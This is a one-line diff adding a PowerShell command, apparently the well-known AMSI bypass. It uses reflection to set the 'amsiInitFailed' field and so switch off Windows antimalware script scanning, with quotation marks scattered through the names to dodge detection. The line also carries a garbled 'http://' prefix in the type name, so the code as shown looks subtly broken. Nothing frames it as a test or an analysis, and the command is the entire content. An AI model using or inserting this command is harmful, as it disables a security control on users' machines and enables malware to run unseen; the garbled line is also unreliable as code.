@@ -1,0 +1,1 @@
+powershell -C [Ref].Assembly.GetType('http://Sys""tem.Mana"gem"ent.Automation.AmsiUtils').GetField('ams"iI"nitFailed','NonPublic,Static').SetValue($null,$true)
